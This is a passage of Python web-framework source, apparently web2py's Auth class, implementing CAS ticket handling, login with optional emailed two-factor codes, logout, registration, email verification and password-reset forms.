self.settings.cas_domains or \\\n                not session._cas_service:\n            raise HTTP(403, 'not authorized')\n\n        def allow_access(interactivelogin=False):\n            row = table(service=session._cas_service, user_id=self.user.id)\n            if row:\n                ticket = row.ticket\n            else:\n                ticket = 'ST-' + web2py_uuid()\n                table.insert(service=session._cas_service,\n                             user_id=self.user.id,\n                             ticket=ticket,\n                             created_on=request.now,\n                             renew=interactivelogin)\n            service = session._cas_service\n            query_sep = '&' if '?' in service else '?'\n            del session._cas_service\n            if 'warn' in request.vars and not interactivelogin:\n                response.headers[\n                    'refresh'] = \"5;URL=%s\" % service + query_sep + \"ticket=\" + ticket\n                return A(\"Continue to %s\" % service,\n                         _href=service + query_sep + \"ticket=\" + ticket)\n            else:\n                redirect(service + query_sep + \"ticket=\" + ticket)\n        if self.is_logged_in() and not 'renew' in request.vars:\n            return allow_access()\n        elif not self.is_logged_in() and 'gateway' in request.vars:\n            redirect(service)\n\n        def cas_onaccept(form, onaccept=onaccept):\n            if not onaccept is DEFAULT:\n                onaccept(form)\n            return allow_access(interactivelogin=True)\n        return self.login(next, onvalidation, cas_onaccept, log)\n\n    def cas_validate(self, version=2, proxy=False):\n        request = current.request\n        db, table = self.db, self.table_cas()\n        current.response.headers['Content-Type'] = 'text'\n        ticket = request.vars.ticket\n        renew = 'renew' in request.vars\n        row = table(ticket=ticket)\n        success = False\n        if row:\n            userfield = self.settings.login_userfield or 'username' \\\n                if 'username' in table.fields else 'email'\n            # If ticket is a service Ticket and RENEW flag respected\n            if ticket[0:3] == 'ST-' and \\\n                    not ((row.renew and renew) ^ renew):\n                user = self.table_user()(row.user_id)\n                row.delete_record()\n                success = True\n\n        def build_response(body):\n            return '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n' +\\\n                TAG['cas:serviceResponse'](\n                    body, **{'_xmlns:cas': 'http://www.yale.edu/tp/cas'}).xml()\n        if success:\n            if version == 1:\n                message = 'yes\\n%s' % user[userfield]\n            else:  # assume version 2\n                username = user.get('username', user[userfield])\n                message = build_response(\n                    TAG['cas:authenticationSuccess'](\n                        TAG['cas:user'](username),\n                        *[TAG['cas:' + field.name](user[field.name])\n                          for field in self.table_user()\n                          if field.readable]))\n        else:\n            if version == 1:\n                message = 'no\\n'\n            elif row:\n                message = build_response(TAG['cas:authenticationFailure']())\n            else:\n                message = build_response(\n                    TAG['cas:authenticationFailure'](\n                        'Ticket %s not recognized' % ticket,\n                        _code='INVALID TICKET'))\n        raise HTTP(200, message)\n\n    def _reset_two_factor_auth(self, session):\n        \"\"\"When two-step authentication is enabled, this function is used to\n        clear the session after successfully completing second challenge\n        or when the maximum number of tries allowed has expired.\n        \"\"\"\n        session.auth_two_factor_user = None\n        session.auth_two_factor = None\n        session.auth_two_factor_enabled = False\n        # Allow up to 4 attempts (the 1st one plus 3 more)\n        session.auth_two_factor_tries_left = 3\n\n    def login(self,\n              next=DEFAULT,\n              onvalidation=DEFAULT,\n              onaccept=DEFAULT,\n              log=DEFAULT,\n              ):\n        \"\"\"\n        Returns a login form\n        \"\"\"\n\n        table_user = self.table_user()\n        settings = self.settings\n        if 'username' in table_user.fields or \\\n                not settings.login_email_validate:\n            tmpvalidator = IS_NOT_EMPTY(error_message=self.messages.is_empty)\n            if not settings.username_case_sensitive:\n                tmpvalidator = [IS_LOWER(), tmpvalidator]\n        else:\n            tmpvalidator = IS_EMAIL(error_message=self.messages.invalid_email)\n            if not settings.email_case_sensitive:\n                tmpvalidator = [IS_LOWER(), tmpvalidator]\n\n        request = current.request\n        response = current.response\n        session = current.session\n\n        passfield = settings.password_field\n        try:\n            table_user[passfield].requires[-1].min_length = 0\n        except:\n            pass\n\n        ### use session for federated login\n        snext = self.get_vars_next()\n        if snext and self.settings.prevent_open_redirect_attacks:\n            items = snext.split('/')\n            if '//' in snext and items[2] != request.env.http_host:\n                snext = None\n\n        if snext:\n            session._auth_next = snext\n        elif session._auth_next:\n            snext = session._auth_next\n        ### pass\n\n        if next is DEFAULT:\n            # important for security\n            next = settings.login_next\n            if callable(next):\n                next = next()\n            user_next = snext\n            if user_next:\n                external = user_next.split('://')\n                if external[0].lower() in ['http', 'https', 'ftp']:\n                    host_next = user_next.split('//', 1)[-1].split('/')[0]\n                    if host_next in settings.cas_domains:\n                        next = user_next\n                else:\n                    next = user_next\n        if onvalidation is DEFAULT:\n            onvalidation = settings.login_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = settings.login_onaccept\n        if log is DEFAULT:\n            log = self.messages['login_log']\n\n        onfail = settings.login_onfail\n\n        user = None  # default\n\n\n        #Setup the default field used for the form\n        multi_login = False\n        if self.settings.login_userfield:\n            username = self.settings.login_userfield\n        else:\n            if 'username' in table_user.fields:\n                username = 'username'\n            else:\n                username = 'email'\n            if self.settings.multi_login:\n                multi_login = True\n        old_requires = table_user[username].requires\n        table_user[username].requires = tmpvalidator\n\n        # If two-factor authentication is enabled, and the maximum\n        # number of tries allowed is used up, reset the session to\n        # pre-login state with two-factor auth\n        if session.auth_two_factor_enabled and session.auth_two_factor_tries_left < 1:\n            # Exceeded maximum allowed tries for this code. Require user to enter\n            # username and password again.\n            user = None\n            accepted_form = False\n            self._reset_two_factor_auth(session)\n            # Redirect to the default 'next' page without logging\n            # in. If that page requires login, user will be redirected\n            # back to the main login form\n            redirect(next, client_side=settings.client_side)\n\n        # Before showing the default login form, check whether\n        # we are already on the second step of two-step authentication.\n        # If we are, then skip this login form and use the form for the\n        # second challenge instead.\n        # Note to devs: The code inside the if-block is unchanged from the\n        # previous version of this file, other than for indentation inside\n        # to put it inside the if-block\n        if session.auth_two_factor_user is None:\n\n            if settings.remember_me_form:\n                extra_fields = [\n                    Field('remember_me', 'boolean', default=False,\n                          label = self.messages.label_remember_me)]\n            else:\n                extra_fields = []\n\n            # do we use our own login form, or from a central source?\n            if settings.login_form == self:\n                form = SQLFORM(\n                    table_user,\n                    fields=[username, passfield],\n                    hidden=dict(_next=next),\n                    showid=settings.showid,\n                    submit_button=self.messages.login_button,\n                    delete_label=self.messages.delete_label,\n                    formstyle=settings.formstyle,\n                    separator=settings.label_separator,\n                    extra_fields = extra_fields,\n                )\n\n\n                captcha = settings.login_captcha or \\\n                    (settings.login_captcha != False and settings.captcha)\n                if captcha:\n                    addrow(form, captcha.label, captcha, captcha.comment,\n                           settings.formstyle, 'captcha__row')\n                accepted_form = False\n\n                if form.accepts(request, session if self.csrf_prevention else None,\n                                formname='login', dbio=False,\n                                onvalidation=onvalidation,\n                                hideerror=settings.hideerror):\n\n                    accepted_form = True\n                    # check for username in db\n                    entered_username = form.vars[username]\n                    if multi_login and '@' in entered_username:\n                        # if '@' in username check for email, not username\n                        user = table_user(email = entered_username)\n                    else:\n                        user = table_user(**{username: entered_username})\n                    if user:\n                        # user in db, check if registration pending or disabled\n                        temp_user = user\n                        if temp_user.registration_key == 'pending':\n                            response.flash = self.messages.registration_pending\n                            return form\n                        elif temp_user.registration_key in ('disabled', 'blocked'):\n                            response.flash = self.messages.login_disabled\n                            return form\n                        elif (not temp_user.registration_key is None\n                              and temp_user.registration_key.strip()):\n                            response.flash = \\\n                                self.messages.registration_verifying\n                            return form\n                        # try alternate logins 1st as these have the\n                        # current version of the password\n                        user = None\n                        for login_method in settings.login_methods:\n                            if login_method != self and \\\n                                    login_method(request.vars[username],\n                                                 request.vars[passfield]):\n                                if not self in settings.login_methods:\n                                    # do not store password in db\n                                    form.vars[passfield] = None\n                                user = self.get_or_create_user(\n                                    form.vars, settings.update_fields)\n                                break\n                        if not user:\n                            # alternates have failed, maybe because service inaccessible\n                            if settings.login_methods[0] == self:\n                                # try logging in locally using cached credentials\n                                if form.vars.get(passfield, '') == temp_user[passfield]:\n                                    # success\n                                    user = temp_user\n                    else:\n                        # user not in db\n                        if not settings.alternate_requires_registration:\n                            # we're allowed to auto-register users from external systems\n                            for login_method in settings.login_methods:\n                                if login_method != self and \\\n                                        login_method(request.vars[username],\n                                                     request.vars[passfield]):\n                                    if not self in settings.login_methods:\n                                        # do not store password in db\n                                        form.vars[passfield] = None\n                                    user = self.get_or_create_user(\n                                        form.vars, settings.update_fields)\n                                    break\n                    if not user:\n                        self.log_event(self.messages['login_failed_log'],\n                                       request.post_vars)\n                        # invalid login\n                        session.flash = self.messages.invalid_login\n                        callback(onfail, None)\n                        redirect(\n                            self.url(args=request.args, vars=request.get_vars),\n                            client_side=settings.client_side)\n\n            else: # use a central authentication server\n                cas = settings.login_form\n                cas_user = cas.get_user()\n\n                if cas_user:\n                    cas_user[passfield] = None\n                    user = self.get_or_create_user(\n                        table_user._filter_fields(cas_user),\n                        settings.update_fields)\n                elif hasattr(cas, 'login_form'):\n                    return cas.login_form()\n                else:\n                    # we need to pass through login again before going on\n                    next = self.url(settings.function, args='login')\n                    redirect(cas.login_url(next),\n                             client_side=settings.client_side)\n\n        # Extra login logic for two-factor authentication\n        #################################################\n        # If the 'user' variable has a value, this means that the first\n        # authentication step was successful (i.e. user provided correct\n        # username and password at the first challenge).\n        # Check if this user is signed up for two-factor authentication\n        # Default rule is that the user must be part of a group that is called\n        # auth.settings.two_factor_authentication_group\n        if user and self.settings.two_factor_authentication_group:\n            role = self.settings.two_factor_authentication_group\n            session.auth_two_factor_enabled = self.has_membership(user_id=user.id, role=role)\n        # challenge\n        if session.auth_two_factor_enabled:\n            form = SQLFORM.factory(\n                Field('authentication_code',\n                      required=True,\n                      comment='This code was emailed to you and is required for login.'),\n                hidden=dict(_next=next),\n                formstyle=settings.formstyle,\n                separator=settings.label_separator\n            )\n            # accepted_form is used by some default web2py code later in the\n            # function that handles running specified functions before redirect\n            # Set it to False until the challenge form is accepted.\n            accepted_form = False\n            # Handle the case when a user has submitted the login/password\n            # form successfully, and the password has been validated, but\n            # the two-factor form has not been displayed or validated yet.\n            if session.auth_two_factor_user is None and user is not None:\n                session.auth_two_factor_user = user # store the validated user and associate with this session\n                session.auth_two_factor = random.randint(100000, 999999)\n                session.auth_two_factor_tries_left = 3 # Allow user to try up to 4 times\n                # TODO: Add some error checking to handle cases where email cannot be sent\n                self.settings.mailer.send(\n                    to=user.email,\n                    subject=\"Two-step Login Authentication Code\",\n                    message=\"Your temporary login code is {0}\".format(session.auth_two_factor))\n            if form.accepts(request, session if self.csrf_prevention else None,\n                            formname='login', dbio=False,\n                            onvalidation=onvalidation,\n                            hideerror=settings.hideerror):\n                accepted_form = True\n                if form.vars['authentication_code'] == str(session.auth_two_factor):\n                    # Handle the case when the two-factor form has been successfully validated\n                    # and the user was previously stored (the current user should be None because\n                    # in this case, the previous username/password login form should not be displayed.\n                    # This will allow the code after the 2-factor authentication block to proceed as\n                    # normal.\n                    if user is None or user == session.auth_two_factor_user:\n                        user = session.auth_two_factor_user\n                    # For security, because the username stored in the\n                    # session somehow does not match the just validated\n                    # user. Should not be possible without session stealing\n                    # which is hard with SSL.\n                    elif user != session.auth_two_factor_user:\n                        user = None\n                    # Either way, the user and code associated with this session should\n                    # be removed. This handles cases where the session login may have\n                    # expired but browser window is open, so the old session key and\n                    # session usernamem will still exist\n                    self._reset_two_factor_auth(session)\n                else:\n                    # TODO: Limit the number of retries allowed.\n                    response.flash = 'Incorrect code. {0} more attempt(s) remaining.'.format(session.auth_two_factor_tries_left)\n                    session.auth_two_factor_tries_left -= 1\n                    return form\n            else:\n                return form\n        # End login logic for two-factor authentication\n\n        # process authenticated users\n        if user:\n            user = Row(table_user._filter_fields(user, id=True))\n            # process authenticated users\n            # user wants to be logged in for longer\n            self.login_user(user)\n            session.auth.expiration = \\\n                request.post_vars.remember_me and \\\n                settings.long_expiration or \\\n                settings.expiration\n            session.auth.remember_me = 'remember_me' in request.post_vars\n            self.log_event(log, user)\n            session.flash = self.messages.logged_in\n\n        # how to continue\n        if settings.login_form == self:\n            if accepted_form:\n                callback(onaccept, form)\n                if next == session._auth_next:\n                    session._auth_next = None\n                next = replace_id(next, form)\n                redirect(next, client_side=settings.client_side)\n\n            table_user[username].requires = old_requires\n            return form\n        elif user:\n            callback(onaccept, None)\n\n        if next == session._auth_next:\n            del session._auth_next\n        redirect(next, client_side=settings.client_side)\n\n    def logout(self, next=DEFAULT, onlogout=DEFAULT, log=DEFAULT):\n        \"\"\"\n        Logouts and redirects to login\n        \"\"\"\n\n        # Clear out 2-step authentication information if user logs\n        # out. This information is also cleared on successful login.\n        self._reset_two_factor_auth(current.session)\n\n        if next is DEFAULT:\n            next = self.get_vars_next() or self.settings.logout_next\n        if onlogout is DEFAULT:\n            onlogout = self.settings.logout_onlogout\n        if onlogout:\n            onlogout(self.user)\n        if log is DEFAULT:\n            log = self.messages['logout_log']\n        if self.user:\n            self.log_event(log, self.user)\n        if self.settings.login_form != self:\n            cas = self.settings.login_form\n            cas_user = cas.get_user()\n            if cas_user:\n                next = cas.logout_url(next)\n\n        current.session.auth = None\n        if self.settings.renew_session_onlogout:\n            current.session.renew(clear_session=not self.settings.keep_session_onlogout)\n        current.session.flash = self.messages.logged_out\n        if not next is None:\n            redirect(next)\n\n    def register(self,\n                 next=DEFAULT,\n                 onvalidation=DEFAULT,\n                 onaccept=DEFAULT,\n                 log=DEFAULT,\n                 ):\n        \"\"\"\n        Returns a registration form\n        \"\"\"\n\n        table_user = self.table_user()\n        request = current.request\n        response = current.response\n        session = current.session\n        if self.is_logged_in():\n            redirect(self.settings.logged_url,\n                     client_side=self.settings.client_side)\n        if next is DEFAULT:\n            next = self.get_vars_next() or self.settings.register_next\n        if onvalidation is DEFAULT:\n            onvalidation = self.settings.register_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = self.settings.register_onaccept\n        if log is DEFAULT:\n            log = self.messages['register_log']\n\n        table_user = self.table_user()\n        if self.settings.login_userfield:\n            username = self.settings.login_userfield\n        elif 'username' in table_user.fields:\n            username = 'username'\n        else:\n            username = 'email'\n\n        # Ensure the username field is unique.\n        unique_validator = IS_NOT_IN_DB(self.db, table_user[username])\n        if not table_user[username].requires:\n            table_user[username].requires = unique_validator\n        elif isinstance(table_user[username].requires, (list, tuple)):\n            if not any([isinstance(validator, IS_NOT_IN_DB) for validator in\n                        table_user[username].requires]):\n                if isinstance(table_user[username].requires, list):\n                    table_user[username].requires.append(unique_validator)\n                else:\n                    table_user[username].requires += (unique_validator, )\n        elif not isinstance(table_user[username].requires, IS_NOT_IN_DB):\n            table_user[username].requires = [table_user[username].requires,\n                                             unique_validator]\n\n        passfield = self.settings.password_field\n        formstyle = self.settings.formstyle\n        if self.settings.register_verify_password:\n            extra_fields = [\n                Field(\"password_two\", \"password\", requires=IS_EQUAL_TO(\n                        request.post_vars.get(passfield, None),\n                        error_message=self.messages.mismatched_password),\n                        label=current.T(\"Confirm Password\"))]\n        else:\n            extra_fields = []\n        form = SQLFORM(table_user,\n                       fields=self.settings.register_fields,\n                       hidden=dict(_next=next),\n                       showid=self.settings.showid,\n                       submit_button=self.messages.register_button,\n                       delete_label=self.messages.delete_label,\n                       formstyle=formstyle,\n                       separator=self.settings.label_separator,\n                       extra_fields = extra_fields\n                       )\n\n        captcha = self.settings.register_captcha or self.settings.captcha\n        if captcha:\n            addrow(form, captcha.label, captcha,\n                   captcha.comment, self.settings.formstyle, 'captcha__row')\n\n        #Add a message if specified\n        if self.settings.pre_registration_div:\n            addrow(form, '',\n                   DIV(_id=\"pre-reg\", *self.settings.pre_registration_div),\n                   '', formstyle, '')\n\n        table_user.registration_key.default = key = web2py_uuid()\n        if form.accepts(request, session if self.csrf_prevention else None,\n                        formname='register',\n                        onvalidation=onvalidation,\n                        hideerror=self.settings.hideerror):\n            description = self.messages.group_description % form.vars\n            if self.settings.create_user_groups:\n                group_id = self.add_group(\n                    self.settings.create_user_groups % form.vars, description)\n                self.add_membership(group_id, form.vars.id)\n            if self.settings.everybody_group_id:\n                self.add_membership(\n                    self.settings.everybody_group_id, form.vars.id)\n            if self.settings.registration_requires_verification:\n                link = self.url(\n                    self.settings.function, args=('verify_email', key), scheme=True)\n                d = dict(form.vars)\n                d.update(dict(key=key, link=link, username=form.vars[username]))\n                if not (self.settings.mailer and self.settings.mailer.send(\n                        to=form.vars.email,\n                        subject=self.messages.verify_email_subject,\n                        message=self.messages.verify_email % d)):\n                    self.db.rollback()\n                    response.flash = self.messages.unable_send_email\n                    return form\n                session.flash = self.messages.email_sent\n            if self.settings.registration_requires_approval and \\\n               not self.settings.registration_requires_verification:\n                table_user[form.vars.id] = dict(registration_key='pending')\n                session.flash = self.messages.registration_pending\n            elif (not self.settings.registration_requires_verification or\n                      self.settings.login_after_registration):\n                if not self.settings.registration_requires_verification:\n                    table_user[form.vars.id] = dict(registration_key='')\n                session.flash = self.messages.registration_successful\n                user = table_user(**{username: form.vars[username]})\n                self.login_user(user)\n                session.flash = self.messages.logged_in\n            self.log_event(log, form.vars)\n            callback(onaccept, form)\n            if not next:\n                next = self.url(args=request.args)\n            else:\n                next = replace_id(next, form)\n            redirect(next, client_side=self.settings.client_side)\n\n        return form\n\n    def is_logged_in(self):\n        \"\"\"\n        Checks if the user is logged in and returns True/False.\n        If so user is in auth.user as well as in session.auth.user\n        \"\"\"\n\n        if self.user:\n            return True\n        return False\n\n    def verify_email(self,\n                     next=DEFAULT,\n                     onaccept=DEFAULT,\n                     log=DEFAULT,\n                     ):\n        \"\"\"\n        Action used to verify the registration email\n        \"\"\"\n\n        key = getarg(-1)\n        table_user = self.table_user()\n        user = table_user(registration_key=key)\n        if not user:\n            redirect(self.settings.login_url)\n        if self.settings.registration_requires_approval:\n            user.update_record(registration_key='pending')\n            current.session.flash = self.messages.registration_pending\n        else:\n            user.update_record(registration_key='')\n            current.session.flash = self.messages.email_verified\n        # make sure session has same user.registrato_key as db record\n        if current.session.auth and current.session.auth.user:\n            current.session.auth.user.registration_key = user.registration_key\n        if log is DEFAULT:\n            log = self.messages['verify_email_log']\n        if next is DEFAULT:\n            next = self.settings.verify_email_next\n        if onaccept is DEFAULT:\n            onaccept = self.settings.verify_email_onaccept\n        self.log_event(log, user)\n        callback(onaccept, user)\n        redirect(next)\n\n    def retrieve_username(self,\n                          next=DEFAULT,\n                          onvalidation=DEFAULT,\n                          onaccept=DEFAULT,\n                          log=DEFAULT,\n                          ):\n        \"\"\"\n        Returns a form to retrieve the user username\n        (only if there is a username field)\n        \"\"\"\n\n        table_user = self.table_user()\n        if not 'username' in table_user.fields:\n            raise HTTP(404)\n        request = current.request\n        response = current.response\n        session = current.session\n        captcha = self.settings.retrieve_username_captcha or \\\n                (self.settings.retrieve_username_captcha != False and self.settings.captcha)\n        if not self.settings.mailer:\n            response.flash = self.messages.function_disabled\n            return ''\n        if next is DEFAULT:\n            next = self.get_vars_next() or self.settings.retrieve_username_next\n        if onvalidation is DEFAULT:\n            onvalidation = self.settings.retrieve_username_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = self.settings.retrieve_username_onaccept\n        if log is DEFAULT:\n            log = self.messages['retrieve_username_log']\n        old_requires = table_user.email.requires\n        table_user.email.requires = [IS_IN_DB(self.db, table_user.email,\n            error_message=self.messages.invalid_email)]\n        form = SQLFORM(table_user,\n                       fields=['email'],\n                       hidden=dict(_next=next),\n                       showid=self.settings.showid,\n                       submit_button=self.messages.submit_button,\n                       delete_label=self.messages.delete_label,\n                       formstyle=self.settings.formstyle,\n                       separator=self.settings.label_separator\n                       )\n        if captcha:\n            addrow(form, captcha.label, captcha,\n                   captcha.comment, self.settings.formstyle, 'captcha__row')\n\n        if form.accepts(request, session if self.csrf_prevention else None,\n                        formname='retrieve_username', dbio=False,\n                        onvalidation=onvalidation, hideerror=self.settings.hideerror):\n            users = table_user._db(table_user.email==form.vars.email).select()\n            if not users:\n                current.session.flash = \\\n                    self.messages.invalid_email\n                redirect(self.url(args=request.args))\n            username = ', '.join(u.username for u in users)\n            self.settings.mailer.send(to=form.vars.email,\n                                      subject=self.messages.retrieve_username_subject,\n                                      message=self.messages.retrieve_username % dict(username=username))\n            session.flash = self.messages.email_sent\n            for user in users:\n                self.log_event(log, user)\n            callback(onaccept, form)\n            if not next:\n                next = self.url(args=request.args)\n            else:\n                next = replace_id(next, form)\n            redirect(next)\n        table_user.email.requires = old_requires\n        return form\n\n    def random_password(self):\n        import string\n        import random\n        password = ''\n        specials = r'!#$*'\n        for i in range(0, 3):\n            password += random.choice(string.lowercase)\n            password += random.choice(string.uppercase)\n            password += random.choice(string.digits)\n            password += random.choice(specials)\n        return ''.join(random.sample(password, len(password)))\n\n    def reset_password_deprecated(self,\n                                  next=DEFAULT,\n                                  onvalidation=DEFAULT,\n                                  onaccept=DEFAULT,\n                                  log=DEFAULT,\n                                  ):\n        \"\"\"\n        Returns a form to reset the user password (deprecated)\n        \"\"\"\n\n        table_user = self.table_user()\n        request = current.request\n        response = current.response\n        session = current.session\n        if not self.settings.mailer:\n            response.flash = self.messages.function_disabled\n            return ''\n        if next is DEFAULT:\n            next = self.get_vars_next() or self.settings.retrieve_password_next\n        if onvalidation is DEFAULT:\n            onvalidation = self.settings.retrieve_password_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = self.settings.retrieve_password_onaccept\n        if log is DEFAULT:\n            log = self.messages['retrieve_password_log']\n        old_requires = table_user.email.requires\n        table_user.email.requires = [IS_IN_DB(self.db, table_user.email,\n            error_message=self.messages.invalid_email)]\n        form = SQLFORM(table_user,\n                       fields=['email'],\n                       hidden=dict(_next=next),\n                       showid=self.settings.showid,\n                       submit_button=self.messages.submit_button,\n                       delete_label=self.messages.delete_label,\n                       formstyle=self.settings.formstyle,\n                       separator=self.settings.label_separator\n                       )\n        if form.accepts(request, session if self.csrf_prevention else None,\n                        formname='retrieve_password', dbio=False,\n                        onvalidation=onvalidation, hideerror=self.settings.hideerror):\n            user = table_user(email=form.vars.email)\n            if not user:\n                current.session.flash = \\\n                    self.messages.invalid_email\n                redirect(self.url(args=request.args))\n            elif user.registration_key in ('pending', 'disabled', 'blocked'):\n                current.session.flash = \\\n                    self.messages.registration_pending\n                redirect(self.url(args=request.args))\n            password = self.random_password()\n            passfield = self.settings.password_field\n            d = {\n                passfield: str(table_user[passfield].validate(password)[0]),\n                'registration_key': ''\n                }\n            user.update_record(**d)\n            if self.settings.mailer and \\\n               self.settings.mailer.send(to=form.vars.email,\n                                         subject=self.messages.retrieve_password_subject,\n                                         message=self.messages.retrieve_password % dict(password=password)):\n                session.flash = self.messages.email_sent\n            else:\n                session.flash = self.messages.unable_to_send_email\n            self.log_event(log, user)\n            callback(onaccept, form)\n            if not next:\n                next = self.url(args=request.args)\n            else:\n                next = replace_id(next, form)\n            redirect(next)\n        table_user.email.requires = old_requires\n        return form\n\n    def confirm_registration(\n        self,\n        next=DEFAULT,\n        onvalidation=DEFAULT,\n        onaccept=DEFAULT,\n        log=DEFAULT,\n        ):\n        \"\"\"\n        Returns a form to confirm user registration\n        \"\"\"\n\n        table_user = self.table_user()\n        request = current.request\n        # response = current.response\n        session = current.session\n\n        if next is DEFAULT:\n            next = self.get_vars_next() or self.settings.reset_password_next\n\n        if self.settings.prevent_password_reset_attacks:\n            key = request.vars.key\n            if not key and len(request.args)>1:\n                key = request.args[-1]\n            if key:\n                session._reset_password_key = key\n                redirect(self.url(args='confirm_registration'))\n            else:\n                key = session._reset_password_key\n        else:\n            key = request.vars.key or getarg(-1)\n        try:\n            t0 = int(key.split('-')[0])\n            if time.time() - t0 > 60 * 60 * 24:\n                raise Exception\n            user = table_user(reset_password_key=key)\n            if not user:\n                raise Exception\n        except Exception as e:\n            session.flash = self.messages.invalid_reset_password\n            redirect(self.url('login', vars=dict(test=e)))\n            redirect(next, client_side=self.settings.client_side)\n        passfield = self.settings.password_field\n        form = SQLFORM.factory(\n            Field('first_name',\n                  label='First Name',\n                  required=True),\n            Field('last_name',\n                  label='Last Name',\n                  required=True),\n            Field('new_password', 'password',\n                  label=self.messages.new_password,\n                  requires=self.table_user()[passfield].requires),\n            Field('new_password2', 'password',\n                  label=self.messages.verify_password,\n                  requires=[IS_EXPR(\n                        'value==%s' % repr(request.vars.new_password),\n                        self.messages.mismatched_password)]),\n            submit_button='Confirm Registration',\n            hidden=dict(_next=next),\n            formstyle=self.settings.formstyle,\n            separator=self.settings.label_separator\n        )\n        if form.process().accepted:\n            user.update_record(\n                **{passfield: str(form.vars.new_password),\n                   'first_name': str(form.vars.first_name),\n                   'last_name': str(form.vars.last_name),\n                   'registration_key': '',\n                   'reset_password_key': ''})\n            session.flash = self.messages.password_changed\n            if self.settings.login_after_password_change:\n                self.login_user(user)\n            redirect(next, client_side=self.settings.client_side)\n        return form\n\n    def email_registration(self, subject, body, user):\n        \"\"\"\n        Sends and email invitation to a user informing they have been registered with the application\n        \"\"\"\n        reset_password_key = str(int(time.time())) + '-' + web2py_uuid()\n        link = self.url(self.settings.function,\n                        args=('confirm_registration',), vars={'key': reset_password_key},\n                        scheme=True)\n        d = dict(user)\n        d.update(dict(key=reset_password_key, link=link, site=current.request.env.http_host))\n        if self.settings.mailer and self.settings.mailer.send(\n            to=user.email,\n            subject=subject % d,\n            message=body % d):\n            user.update_record(reset_password_key=reset_password_key)\n            return True\n        return False\n\n    def bulk_register(self, max_emails=100):\n        \"\"\"\n        Creates a form for ther user to send invites to other users to join\n        \"\"\"\n        if not self.user:\n            redirect(self.settings.login_url)\n        if not self.setting.bulk_register_enabled:\n            return HTTP(404)\n\n        form = SQLFORM.factory(\n            Field('subject','string',default=self.messages.bulk_invite_subject,requires=IS_NOT_EMPTY()),\n            Field('emails','text',requires=IS_NOT_EMPTY()),\n            Field('message','text',default=self.messages.bulk_invite_body,requires=IS_NOT_EMPTY()),\n            formstyle=self.settings.formstyle)\n\n        if form.process().accepted:\n            emails = re.compile('[^\\s\\'\"@<>,;:]+\\@[^\\s\\'\"@<>,;:]+').findall(form.vars.emails)\n            # send the invitations            \n            emails_sent = []\n            emails_fail = []\n            emails_exist = []\n            for email in emails[:max_emails]:\n                if self.table_user()(email=email):\n                    emails_exist.append(email)\n                else:\n                    user = self.register_bare(email=email)\n                    if self.email_registration(form.vars.subject, form.vars.message, user):\n                        emails_sent.append(email)\n                    else:\n                        emails_fail.append(email)\n            emails_fail += emails[max_emails:]\n            form = DIV(H4('Emails sent'),UL(*[A(x,_href='mailto:'+x) for x in emails_sent]),\n                       H4('Emails failed'),UL(*[A(x,_href='mailto:'+x) for x in emails_fail]),\n                       H4('Emails existing'),UL(*[A(x,_href='mailto:'+x) for x in emails_exist]))\n        return form\n\n    def manage_tokens(self):\n        if not self.user:\n            redirect(self.settings.login_url)        \n        table_token =self.table_token()\n        table_token.user_id.writable = False\n        table_token.user_id.default = self.user.id\n        table_token.token.writable = False\n        if current.request.args(1) == 'new':\n            table_token.token.readable = False\n        form = SQLFORM.grid(table_token, args=['manage_tokens'])\n        return form\n\n    def reset_password(self,\n                       next=DEFAULT,\n                       onvalidation=DEFAULT,\n                       onaccept=DEFAULT,\n                       log=DEFAULT,\n                       ):\n        \"\"\"\n        Returns a form to reset the user password\n        \"\"\"\n\n        table_user = self.table_user()\n        request = current.request\n        # response = current.response\n        session = current.session\n\n        if next is DEFAULT:\n            next = self.get_vars_next() or self.settings.reset_password_next\n\n        if self.settings.prevent_password_reset_attacks:\n            key = request.vars.key\n            if key:\n                session._reset_password_key = key\n                redirect(self.url(args='reset_password'))\n            else:\n                key = session._reset_password_key\n        else:\n            key = request.vars.key\n        try:\n            t0 = int(key.split('-')[0])\n            if time.time() - t0 > 60 * 60 * 24:\n                raise Exception\n            user = table_user(reset_password_key=key)\n            if not user:\n                raise Exception\n        except Exception:\n            session.flash = self.messages.invalid_reset_password\n            redirect(next, client_side=self.settings.client_side)\n\n        if onvalidation is DEFAULT:\n            onvalidation = self.settings.reset_password_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = self.settings.reset_password_onaccept\n\n        passfield = self.settings.password_field\n        form = SQLFORM.factory(\n            Field('new_password', 'password',\n                  label=self.messages.new_password,\n                  requires=self.table_user()[passfield].requires),\n            Field('new_password2', 'password',\n                  label=self.messages.verify_password,\n                  requires=[IS_EXPR(\n                      'value==%s' % repr(request.vars.new_password),\n                                    self.messages.mismatched_password)]),\n            submit_button=self.messages.password_reset_button,\n            hidden=dict(_next=next),\n            formstyle=self.settings.formstyle,\n            separator=self.settings.label_separator\n        )\n        if form.accepts(request, session, onvalidation=onvalidation,\n                        hideerror=self.settings.hideerror):\n            user.update_record(\n                **{passfield: str(form.vars.new_password),\n                   'registration_key': '',\n                   'reset_password_key': ''})\n            session.flash = self.messages.password_changed\n            if self.settings.login_after_password_change:\n                self.login_user(user)\n            callback(onaccept, form)\n            redirect(next, client_side=self.settings.client_side)\n        return form\n\n    def request_reset_password(self,\n                               next=DEFAULT,\n                               onvalidation=DEFAULT,\n                               onaccept=DEFAULT,\n                               log=DEFAULT,\n                               ):\n        \"\"\"\n        Returns a form to reset the user password\n        \"\"\"\n        table_user = self.table_user()\n        request = current.request\n        response = current.response\n        session = current.session\n        captcha = self.settings.retrieve_password_captcha or \\\n                (self.settings.retrieve_password_captcha != False and self.settings.captcha)\n\n        if next is DEFAULT:\n            next = self.get_vars_next() or self.settings.request_reset_password_next\n        if not self.settings.mailer:\n            response.flash = self.messages.function_disabled\n            return ''\n        if onvalidation is DEFAULT:\n            onvalidation = self.settings.request_reset_password_onvalidation\n        if onaccept is DEFAULT:\n            onaccept = self.settings.request_reset_password_onaccept\n        if log is DEFAULT:\n            log = self.messages['reset_password_log']\n        userfield = self.settings.login_userfield or 'username' \\\n            if 'username' in table_user.fields else 'email'\n        if userfield == 'email':\n            table_user.email.requires = [\n                IS_EMAIL(error_message=self.messages.invalid_email),\n                IS_IN_DB(self.db, table_user.email,\n                         error_message=self.messages.invalid_email)]\n            if not self.settings.email_case_sensitive:\n                table_user.email.requires.insert(0, 